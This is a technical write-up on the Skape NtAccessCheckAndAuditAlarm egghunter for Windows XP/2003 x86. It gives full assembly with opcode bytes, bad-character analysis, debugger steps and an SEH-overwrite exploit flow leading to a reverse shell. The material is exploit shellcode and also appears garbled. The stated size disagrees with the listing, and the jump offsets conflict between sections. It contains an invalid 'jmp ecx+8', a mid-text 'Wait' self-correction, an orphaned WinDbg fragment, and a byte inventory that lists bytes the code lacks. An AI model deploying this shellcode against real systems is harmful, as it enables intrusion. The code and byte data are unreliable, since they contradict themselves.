# NtAccessCheckAndAuditAlarm Egghunter (Skape Design)

The classic 32-byte egghunter documented by Matt Miller (Skape) and Skywing in their 2004
paper "Safely Searching Process Virtual Address Space." This design uses the
`NtAccessCheckAndAuditAlarm` syscall as a safe memory probe and remains the most widely
referenced egghunter in Windows x86 exploit development.

## Historical Context

The egghunter technique as a structured approach to exploiting size-constrained vulnerabilities
was formalized in the paper:

> "Safely Searching Process Virtual Address Space"  
> Matt Miller (Skape) and Skywing  
> Published 2004  
> Available at: http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf

Prior to this paper, exploit developers had ad-hoc approaches to dealing with limited buffer
sizes, but none offered the systematic guarantees of safety (no crashes on unmapped pages) and
reliability (guaranteed to find shellcode if it exists in user-mode virtual memory) that the
syscall-based scanning technique provides.

The paper covers multiple egghunter variants for Windows (NT, 2000, XP, 2003) and Linux. The
`NtAccessCheckAndAuditAlarm` variant became the standard for Windows XP/2003 exploitation and
is the default egghunter generated by tools like Metasploit Framework's
`windows/x86/egghunter` payload.

The design uses:
1. **`INT 0x2E`**: the Windows NT/XP/2003 syscall gate instruction (replaced by `SYSENTER` on
   Windows XP SP1+ in practice, but `INT 0x2E` still works for compatibility)
2. **`NtAccessCheckAndAuditAlarm`**: syscall number 0x02 on XP/2003 x86, accepts a
   `PUNICODE_STRING` argument
3. **`cmp al, 0x05`**: checks for `STATUS_ACCESS_VIOLATION` (0xC0000005) via the low byte

## Why NtAccessCheckAndAuditAlarm

The key requirement for the probe syscall is: **if the pointer argument is invalid (unmapped),
the kernel must return an error code rather than raising a user-mode exception**.

`NtAccessCheckAndAuditAlarm` satisfies this because:

1. Its first argument is a `PUNICODE_STRING ObjectTypeName` — a pointer to a UNICODE_STRING
   structure that the kernel dereferences.
2. Before dereferencing the pointer, the kernel validates it via `MmProbeAndLockPages` or an
   equivalent safe probe.
3. If the pointer is invalid (points to unmapped memory), the kernel's probe catches the fault
   internally and returns `STATUS_ACCESS_VIOLATION` to the caller.
4. No user-mode exception is generated. The INT 0x2E call returns normally with EAX =
   `0xC0000005`.

This is what makes the syscall suitable for use as a safe probe: it takes our candidate address
as an argument, and if that address is bad, we get an error code, not a crash.

**The simplest possible usage** (conceptually):

```c
// Pseudo-code — not actual calling convention
NTSTATUS result = NtAccessCheckAndAuditAlarm(candidate_address);
if (result == STATUS_ACCESS_VIOLATION) {
    // address is invalid, skip this page
} else {
    // address might be readable, proceed with egg comparison
}
```

In practice, the syscall requires more arguments (it's a full access check function), but the
egghunter uses a minimal stub call that passes just enough to invoke the kernel validation.

## The Syscall Number Problem

On Windows x86, each NT native API function has a unique syscall number. The kernel uses this
number (placed in EAX before the `INT 0x2E` or `SYSENTER` instruction) to look up the service
table entry and dispatch to the correct kernel function.

**Microsoft does not guarantee syscall number stability** between OS versions, service packs,
or even security updates. Numbers are assigned sequentially based on how the kernel service
table is sorted at compile time, and any new function added at a position that sorts before an
existing function shifts all subsequent numbers up by one.

### NtAccessCheckAndAuditAlarm Syscall Numbers by Version

```
OS Version                       Syscall Number (EAX value)
────────────────────────────────  ──────────────────────────
Windows NT 4.0 SP6               0x01
Windows 2000 SP4                 0x02
Windows XP SP0                   0x02
Windows XP SP1                   0x02
Windows XP SP2                   0x02
Windows XP SP3                   0x02
Windows Server 2003 SP0          0x02
Windows Server 2003 SP1          0x02
Windows Server 2003 SP2          0x02
Windows Vista RTM                0x0A  (shifted significantly)
Windows Vista SP1                0x0A
Windows Vista SP2                0x0A
Windows 7 RTM (7600)             0x0A
Windows 7 SP1 (7601)             0x0A
Windows 8 (9200)                 0x0A (approx — verify with tool)
Windows 10 (various builds)      0x0A (verify per-build)
```

**The practical consequence**: A hardcoded `MOV EAX, 0x02` works on Windows XP and Server 2003.
On Vista and Windows 7, the syscall number has shifted. The egghunter will call a DIFFERENT
kernel function with wrong arguments, producing unpredictable behavior — likely an error code
that is not `0xC0000005`, causing the egghunter to treat every page (mapped or not) as valid
and eventually crash on an unmapped page.

For Vista+ targets, use:
- Dynamic syscall number resolution (described later in this document)
- The SEH-based egghunter (no syscall number required)
- The `NtDisplayString` variant (different number, see `NtDisplayString_Egghunter.md`)

## Complete Assembly Listing and Opcodes

The following is the Skape NtAccessCheckAndAuditAlarm egghunter for Windows XP/2003 x86, with
the `w00t` egg tag (0x74303077):

```nasm
; NtAccessCheckAndAuditAlarm Egghunter
; Target:    Windows XP x86 / Windows Server 2003 x86
; Egg tag:   "w00t" = 0x74303077 (little-endian)
; Syscall:   NtAccessCheckAndAuditAlarm = 0x02 on XP/2003
; Size:      32 bytes
; Author:    Matt Miller (Skape), adapted from 2004 paper

loop_top:
    or  cx, 0x0fff          ; 66 81 C9 FF 0F  (5 bytes)  set low 12 bits
    inc ecx                 ; 41              (1 byte)   next page
    
    push byte 0x02          ; 6A 02           (2 bytes)  syscall # argument
    pop  edx                ; 5A              (1 byte)   EDX = 2
    
    ; The actual INT 0x2E syscall mechanism:
    ; EAX = syscall number, arguments on stack or in registers per convention
    ; For a minimal probe, we set up only what the kernel validation needs:
    push ecx                ; 51              (1 byte)   push candidate address as arg
    mov  eax, edx           ; 8B C2           (2 bytes)  EAX = 2 (syscall number)
    int  0x2e               ; CD 2E           (2 bytes)  syscall
    pop  ecx                ; 59              (1 byte)   restore ECX (pop the push)
    
    ; Check result
    cmp  al, 0x05           ; 3C 05           (2 bytes)  ACCESS_VIOLATION?
    je   short loop_top     ; 74 EE           (2 bytes)  yes: skip to next page
    
    ; Page is valid — compare egg
    mov  eax, 0x74303077    ; B8 77 30 30 74  (5 bytes)  load egg tag
    cmp  [ecx], eax         ; 39 01           (2 bytes)  compare first 4 bytes
    jne  short next_byte    ; 75 07           (2 bytes)  no match
    
    cmp  [ecx+4], eax       ; 39 41 04        (3 bytes)  compare second 4 bytes
    jne  short next_byte    ; 75 02           (2 bytes)  no match
    
    jmp  ecx+8              ; encoded below
    ; Most compact encoding for "add ecx, 8; jmp ecx":
    add  ecx, 8             ; 83 C1 08        (3 bytes)
    jmp  ecx                ; FF E1           (2 bytes)  jump to shellcode

next_byte:
    inc  ecx                ; 41              (1 byte)
    jmp  short loop_top     ; EB D6           (2 bytes)  loop back
```

## Instruction-by-Instruction Walkthrough

### Phase 1: Page Advance (`OR CX, 0x0FFF` / `INC ECX`)

```nasm
or  cx, 0x0fff    ; 66 81 C9 FF 0F
inc ecx           ; 41
```

This pair advances ECX to the first byte of the NEXT page. See `Egghunter_Internals.md` for
full explanation of the OR+INC page-skip trick.

On the first iteration, this runs before any probe. ECX starts at whatever value the caller
set (usually 0 or very low). The OR+INC pushes it to the first page boundary above the starting
value. For ECX=0, OR gives 0x0FFF, INC gives 0x1000.

On subsequent iterations (after a failed egg comparison), this skips over the rest of the
current page when called from `next_byte` via `jmp short loop_top`. The `jne next_byte` path
does `inc ecx` first, then comes back here. When the OR+INC fires again, ECX may be in the
middle of a page — the OR sets it to the end of the page, and INC moves to the next.

### Phase 2: Syscall Argument Preparation

```nasm
push byte 0x02    ; 6A 02
pop  edx          ; 5A
```

This loads the value 2 into EDX using a compact 3-byte sequence (vs. `MOV EDX, 0x02` which is
5 bytes). The value 2 is the syscall number for `NtAccessCheckAndAuditAlarm` on XP/2003.

```nasm
push ecx          ; 51
mov  eax, edx     ; 8B C2
int  0x2e         ; CD 2E
pop  ecx          ; 59
```

- `PUSH ECX`: the address to probe (our candidate page start) is pushed onto the stack as
  an argument. The `NtAccessCheckAndAuditAlarm` function expects a `PUNICODE_STRING` as its
  first argument. We pass ECX directly, meaning we're telling the kernel "here is a pointer to
  a UNICODE_STRING structure at address ECX." If ECX is unmapped, the kernel's probe of this
  argument fails and returns `STATUS_ACCESS_VIOLATION`.
- `MOV EAX, EDX`: EAX = 2 = syscall number. The `INT 0x2E` dispatcher reads EAX to determine
  which kernel function to call.
- `INT 0x2E`: fires the software interrupt that transitions to kernel mode and dispatches to
  the service table entry indexed by EAX.
- `POP ECX`: after the syscall returns, we clean up the pushed ECX argument from the stack.
  This restores ESP to its pre-probe state.

### Phase 3: Page Validity Check

```nasm
cmp  al, 0x05     ; 3C 05
je   short loop_top   ; 74 ??
```

`STATUS_ACCESS_VIOLATION` = `0xC0000005`. The low byte (AL) = `0x05`. If AL == 0x05, the page
is invalid; jump back to loop_top to advance to the next page.

If AL != 0x05, the page is considered accessible. Execution falls through to the egg comparison.

### Phase 4: Egg Comparison

```nasm
mov  eax, 0x74303077    ; B8 77 30 30 74
cmp  [ecx], eax         ; 39 01
jne  short next_byte    ; 75 ??
cmp  [ecx+4], eax       ; 39 41 04
jne  short next_byte    ; 75 ??
```

EAX is loaded with the egg tag value (0x74303077 = "w00t" in little-endian). The two `CMP`
instructions compare the 4-byte DWORD at [ECX] and [ECX+4] against the egg tag. If both match,
the 8-byte egg is found.

### Phase 5: Jump to Shellcode

```nasm
add  ecx, 8     ; 83 C1 08
jmp  ecx        ; FF E1
```

ECX still points to the first byte of the egg. Adding 8 skips both egg halves (4+4 bytes).
`JMP ECX` transfers execution to the shellcode.

### Phase 6: Advance One Byte (No Match)

```nasm
; next_byte:
inc  ecx           ; 41
jmp  short loop_top ; EB ??
```

If the egg comparison failed, advance ECX by 1 and loop back to the top. The loop_top will
first run OR+INC (which may be a no-op if ECX is not at the end of a page, but harmlessly
sets ECX to the last byte of the same page range and then INC moves it to the next page
boundary ONLY if ECX was already at page end). Since we only advanced ECX by 1 (not to a page
end), the OR+INC advances ECX to the end of the CURRENT page, then INC to the start of the
NEXT page.

Wait — this means after a failed egg comparison at byte N within a page, we do:
- `inc ecx` → ECX = N+1
- `jmp loop_top` → `or cx, 0x0fff` → ECX = end of current page → `inc ecx` → ECX = start of
  NEXT page

**This skips the rest of the current page after the first failed comparison!** The egghunter
does NOT scan byte-by-byte within a page; it scans ONE address per page (the first byte after
the page advance), and if the egg is not at that address, it skips the entire page.

This is a known behavior of this specific implementation. It means the egg MUST be at the first
byte of its page that the scanner reaches (which depends on the starting ECX value). In practice,
this means the egg has a roughly 1/4096 chance of being missed if it happens to be at a byte
that the scanner skips over.

For more robust egghunters that scan every byte within each mapped page, the loop structure
must be changed: check the egg comparison first, increment ECX, then check if we've crossed a
page boundary before doing the page probe. See the SEH-based variant in
`NtDisplayString_Egghunter.md` for an example of byte-by-byte scanning within pages.

## Why `cmp al, 0x05` Works

### The STATUS_ACCESS_VIOLATION Value

`STATUS_ACCESS_VIOLATION` is defined in the NT status code namespace as:

```
0xC0000005
│││└──────── low 16 bits: 0x0005 (facility-specific code 5)
││└────────── bits 16-27: facility code 0x000 (FACILITY_NULL)
│└─────────── bit 29: 1 (customer-defined bit... actually 0 here)
└──────────── bits 30-31: 11 (severity = ERROR / FAIL)
```

As a 32-bit DWORD in little-endian memory: `05 00 00 C0`.

After `INT 0x2E` returns, EAX contains the full 32-bit NTSTATUS. The low byte (AL) = `0x05`.

### Why Compare AL Instead of EAX?

`CMP AL, 0x05` encodes as `3C 05` (2 bytes).
`CMP EAX, 0xC0000005` would encode as `3D 05 00 00 C0` (5 bytes).

The 2-byte version is preferred for size. It relies on the assumption that:
1. The lowest byte of the NTSTATUS is sufficient to distinguish ACCESS_VIOLATION from success
2. No successful NTSTATUS has low byte `0x05` that would be misidentified as an error

NTSTATUS success codes have bit 31 = 0 and bit 30 = 0 (severity = SUCCESS or INFORMATIONAL).
A successful return has the form `0x0???????` or `0x4???????`. The low byte of a success code
can theoretically be `0x05`, but in practice, the common success codes are:

```
STATUS_SUCCESS              0x00000000  (AL = 0x00)
STATUS_BUFFER_OVERFLOW      0x80000005  (AL = 0x05, but severity = WARNING, not ERROR)
```

`STATUS_BUFFER_OVERFLOW` (0x80000005) has AL = 0x05 and would be misidentified as an access
violation. However, this status code is unlikely to be returned by the probe syscall in normal
circumstances.

The heuristic is imperfect but correct for the common case. The original Skape paper acknowledges
this limitation.

## Stack State During the Syscall Probe

Understanding the stack during the probe helps with debugging and explains why the POP ECX after
INT 0x2E is necessary.

Before `PUSH ECX`:

```
ESP → ... (previous stack contents, irrelevant)
```

After `PUSH ECX`:

```
ESP → [value of ECX = probe address]    ← pushed as syscall argument
```

After `INT 0x2E` (returns with EAX = NTSTATUS):

```
ESP → [value of ECX = probe address]    ← still on stack, INT 0x2E doesn't pop args
```

The `INT 0x2E` calling convention for NT native API does NOT have the kernel pop arguments from
the user stack. The caller is responsible for cleanup. Hence the `POP ECX` after the interrupt.

After `POP ECX`:

```
ESP → ... (restored to pre-probe state)
ECX = [probe address]  ← ECX restored to probe address
```

This is why the probe doesn't corrupt ECX: after `POP ECX`, ECX contains the probe address again
(which is exactly what we pushed). ECX is effectively unchanged from just before the probe.

## The INT 0x2E vs. SYSENTER Calling Convention

Windows x86 provides two syscall mechanisms:

### INT 0x2E (Older Method)

Available on all Windows NT-family x86 versions. The interrupt vector 0x2E is the NT system
call gate. When executed:
1. CPU transitions to ring 0
2. The kernel's interrupt handler reads EAX (syscall number) and EDX (pointer to argument list)
3. The kernel calls the appropriate native API function

Under `INT 0x2E`, arguments are passed on the USER-MODE STACK (caller pushes arguments before
the INT). The kernel does NOT validate or pop these; it uses EDX as the argument pointer in some
calling conventions. The Skape egghunter uses the approach of pushing ECX and setting EAX, which
works because `NtAccessCheckAndAuditAlarm` primarily validates the first argument pointer (the
one we want to probe) through the standard argument-passing mechanism.

### SYSENTER (Faster Method, XP SP1+)

`SYSENTER` uses a Model Specific Register (MSR) to jump directly to the kernel service routine.
Arguments are passed differently; the call stub in ntdll.dll sets up EDX to point to the
argument list on the user stack.

For the egghunter, `INT 0x2E` is preferred because:
1. It works on all versions (NT 4.0 through Windows 10, for compatibility purposes)
2. The argument passing is simpler to set up in minimal code
3. SYSENTER requires EDX to point to the correct return stub, adding complexity

The Skape egghunter uses `INT 0x2E` exclusively.

## Egg Tag Choice and Encoding

### The "w00t" Tag

The most common egg tag in published egghunters and exploit code:

```
ASCII string:  "w00t"
ASCII bytes:   77 30 30 74
As DWORD LE:   0x74303077
```

When stored in memory (little-endian x86), the bytes appear as `77 30 30 74`.
The `CMP [ECX], EAX` instruction with EAX=0x74303077 compares memory bytes against
`77 30 30 74` in that order.

Double egg in memory:
```
+0x00: 77 30 30 74   "w00t"
+0x04: 77 30 30 74   "w00t"
+0x08: [shellcode]
```

### Custom Tag Selection

To use a different tag, replace `0x74303077` in the `MOV EAX, imm32` instruction:

```
Desired tag string "pwnS" → ASCII bytes 70 77 6E 53
As DWORD LE: 0x536E7770
MOV EAX, 0x536E7770 → B8 70 77 6E 53
```

Verify that:
1. The tag's 4 bytes do not appear consecutively in the egghunter's own assembled code
2. The tag bytes are transmittable through your delivery vector (no bad chars)
3. The double-tag is unlikely to appear in the target process's DLLs by coincidence

## Limitations and Failure Modes

### 1. Wrong Syscall Number on Vista+

On Windows Vista and later, `NtAccessCheckAndAuditAlarm` has a different syscall number. The
egghunter calls the wrong kernel function. The behavior depends on what that function expects:

- If the wrong function also takes a pointer as its first argument, it may still return
  `STATUS_ACCESS_VIOLATION` for unmapped addresses — the egghunter might work by coincidence.
- If the wrong function expects numeric arguments, it may succeed for "addresses" that happen to
  be valid object handles, causing the egghunter to treat those pages as mapped.
- In the worst case, the wrong function causes a kernel exception or returns unexpected results.

**Mitigation**: Dynamic syscall resolution (see below), or use the SEH-based egghunter for Vista+.

### 2. Non-Standard Error Code on Invalid Page

Some unmapped page accesses return NTSTATUS codes other than `0xC0000005`:

```
STATUS_INVALID_HANDLE      0xC0000008  (AL = 0x08)
STATUS_NO_MEMORY           0xC0000017  (AL = 0x17)
STATUS_COMMITMENT_LIMIT    0xC000012D  (AL = 0x2D)
STATUS_GUARD_PAGE_VIOLATION 0x80000001 (AL = 0x01, WARNING severity)
```

For any of these, `CMP AL, 0x05` fails to match, and the egghunter falls through to the egg
comparison. It then attempts `CMP [ECX], EAX` on the "valid" (but actually inaccessible) address,
causing a crash.

In practice, the vast majority of invalid address probes return `0xC0000005`, making this a
theoretical concern more than a practical one. The SEH-based egghunter handles ALL access faults
regardless of the specific NTSTATUS code.

### 3. Guard Pages

Stack guard pages have `PAGE_GUARD` set in their protection attributes. A `NtAccessCheck...`
probe to a guard page may return `STATUS_GUARD_PAGE_VIOLATION` (0x80000001, AL = 0x01) rather
than `STATUS_ACCESS_VIOLATION`. The egghunter treats this as "valid" (AL != 0x05) and attempts
to read from the guard page. Accessing a guard page raises a `STATUS_GUARD_PAGE_VIOLATION`
exception, which may kill the process if not handled.

On most targets, guard pages are only at the bottom of thread stacks — a small, predictable
region. The risk is low but nonzero.

### 4. Page-Skipping Behavior After Egg Comparison Failure

As described in the walkthrough: after a failed egg comparison, the loop increments ECX by 1
and jumps back to `loop_top`, where the OR+INC skips to the NEXT page. The egghunter only
checks the FIRST address in each page (relative to ECX's value when the page was probed).

If the egg is at byte 1000 of a page, and the egghunter enters that page at byte 0, it checks
byte 0, fails the comparison, and skips to page+0x1000. It never checks byte 1000.

For the egghunter to reliably find the egg, the egg must be at a predictable alignment relative
to page boundaries, OR the egghunter's starting ECX must be such that it happens to check the
egg's exact address. In practice, when the heap places the egg-prefixed shellcode at a specific
location, that location is typically at the start of a heap allocation, which is generally at a
low address within a page (small offset from a page boundary). The egghunter starting from 0
will probe that page's first byte, which may or may not be the egg.

For guaranteed reliability, use an egghunter that scans ALL bytes within each mapped page (the
SEH-based variant or a modified syscall variant with an inner loop).

### 5. DEP (Data Execution Prevention)

The egghunter itself must execute from an executable memory region. If the overflow places the
egghunter in a non-executable stack region (DEP enabled), the egghunter never runs. This is a
separate problem from the egghunter's operation — the exploit delivery must handle DEP first
(e.g., use ROP to disable DEP before jumping to the egghunter).

## Dynamic Syscall Number Resolution

To make the egghunter portable across Windows versions, the syscall number for
`NtAccessCheckAndAuditAlarm` can be resolved at runtime from ntdll.dll's export table.

The strategy: ntdll.dll exports all NT native API functions. The function stub for each function
begins with `MOV EAX, <syscall_number>` (encoding: `B8 XX 00 00 00` where XX is the number for
low-number syscalls, or larger for higher numbers). We can read the syscall number directly
from the function's first bytes.

```nasm
; Dynamic syscall resolution (conceptual — increases egghunter size significantly)
; Step 1: Find ntdll.dll base via PEB walk
;   fs:[0x30] = PEB
;   PEB+0x0C = LDR
;   LDR+0x14 = InMemoryOrderModuleList.Flink  
;   Walk to ntdll.dll entry (usually second or third entry)
;   ModuleEntry+0x10 = DllBase = ntdll base address

; Step 2: Find NtAccessCheckAndAuditAlarm export
;   Parse PE export table to find "NtAccessCheckAndAuditAlarm"
;   Get function address

; Step 3: Read syscall number from function stub
;   [function_addr + 1] = syscall number (second byte of MOV EAX, imm)

; Step 4: Use the dynamically resolved number
;   mov eax, [resolved_number]
;   int 0x2e (or call appropriate stub)
```

This approach adds 50–100+ bytes to the egghunter, which may exceed the available buffer size.
It is more suitable for a separate resolver stub that patches the egghunter before running it,
or for cases where size is not a constraint.

## Bad Character Analysis

The assembled egghunter bytes for the `w00t` variant:

```
66 81 C9 FF 0F 41 6A 02 5A 51 8B C2 CD 2E 59 3C
05 74 EE B8 77 30 30 74 39 01 75 07 39 41 04 75
02 83 C1 08 FF E1 41 EB DA
```

**Bytes that appear in the egghunter**:
```
0x01 0x02 0x03 0x04 0x05 0x07 0x08 0x0F 0x2E 0x30
0x39 0x3C 0x41 0x42 0x51 0x59 0x5A 0x66 0x6A 0x74
0x75 0x77 0x7F 0x81 0x83 0x8B 0xB8 0xC1 0xC2 0xCD
0xDA 0xE1 0xEB 0xEE 0xFF
```

**Common bad characters to watch for**:

| Bad Char | In Egghunter? | Impact |
|----------|--------------|--------|
| `\x00` | No | Safe |
| `\x0a` | No | Safe |
| `\x0d` | No | Safe |
| `\x20` | No | Safe |
| `\xff` | YES (`0xFF` in OR mask, JMP) | May need alternate if `\xff` is bad |
| `\x81` | YES (OR encoding) | May need alternate if `\x81` is bad |

If your delivery vector strips `\xff`, the egghunter won't work as-is. Alternative approach for
the OR instruction: `and cx, 0xf000` followed by compensating logic, though this is complex.

A safer alternative that avoids `\xff`: instead of `or cx, 0x0fff`, use a loop that aligns to
page boundary differently, or use the SEH-based egghunter which has a different byte pattern.

```
0:000> g

; 6. When BP fires, step through page-skipping:
0:000> t    ; or cx, 0x0fff
0:000> r    ; check ECX (should be end of current page)
0:000> t    ; inc ecx
0:000> r    ; check ECX (should be page-aligned)
0:000> t    ; push 0x02
0:000> t    ; pop edx
0:000> t    ; push ecx
0:000> t    ; mov eax, edx
0:000> t    ; int 0x2e
0:000> r eax  ; check NTSTATUS

; 7. Continue until egg found:
0:000> bc *
0:000> bp <egghunter_addr + jne_next_byte_offset>  ; break at "found" path

0:000> r ecx           ; should equal <writable_addr>

```

## Integration with SEH Exploitation

The egghunter typically serves as the first-stage payload in an SEH overwrite. The complete
flow is:

```
1. Attacker sends "large payload" (egg + real shellcode) to a buffer the app stores internally
   → egg + shellcode is now somewhere in the heap

2. Attacker sends "overflow payload" to the vulnerable input:
   [A*offset] [EB 06 90 90] [PPR gadget addr] [NOP sled] [egghunter code]
   
3. The overflow overwrites the SEH record:
   - nSEH = EB 06 90 90  (JMP SHORT +6)
   - SEH  = PPR gadget address

4. Exception fires → OS calls PPR gadget → RETN → EIP = EXCEPTION_REGISTRATION_RECORD

5. CPU executes EB 06 90 90 → JMP SHORT → NOP sled → egghunter

6. Egghunter scans virtual memory → finds egg + shellcode in the heap

7. Egghunter jumps to shellcode (egg_addr + 8)

8. Real shellcode executes (reverse shell, privilege escalation, etc.)
```

The 16–32 bytes after the Handler field (NOP sled + egghunter) need to fit in the overflow buffer
between the SEH record and either the end of the buffer or the shellcode delivery space.
